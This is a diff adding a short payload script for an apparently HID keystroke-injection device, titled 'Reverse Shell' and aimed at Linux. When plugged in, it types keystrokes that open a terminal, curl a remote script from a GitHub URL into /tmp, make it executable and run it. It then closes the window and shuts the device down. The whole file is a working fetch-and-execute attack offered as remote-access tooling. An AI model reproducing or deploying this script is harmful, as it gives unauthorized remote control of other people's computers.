@@ -1,0 +1,77 @@
+#!/bin/bash
+#
+# Title:            Reverse Shell
+# 
+# Description:
+#                   1) Downloads a payload from internet
+#                   2) Executes payload
+
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Remote Access
+# Target:           Linux
+# Attackmodes:      HID
+#
+
+######## INITIALIZATION ########
+
+readonly PAYLOAD_DOWNLOAD_URI="https://raw.githubusercontent.com/SlyJose/whatdoyoumeanthisispii/main/remote.sh"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+udisk mount
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q DELAY 7000
+Q CTRL-ALT t
+Q DELAY 5000
+
+LED STAGE2
+
+Q STRING " bash"
+Q ENTER
+Q DELAY 1500
+Q STRING " curl ${PAYLOAD_DOWNLOAD_URI} -o /tmp/bb"
+Q ENTER
+Q DELAY 5000
+
+LED STAGE3
+
+Q STRING " chmod +x /tmp/bb"
+Q ENTER
+Q DELAY 1500
+
+Q STRING " cd /tmp"
+Q ENTER
+Q DELAY 1500
+Q STRING " ./bb"
+Q ENTER
+Q DELAY 5000
+
+LED STAGE4
+
+#Q STRING " exit"
+Q CTRL-SHIFT q
+Q ENTER
+Q DELAY 1000
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+udisk unmount
+
+######## FINISH ########
+
+LED FINISH
+
+shutdown -h 0
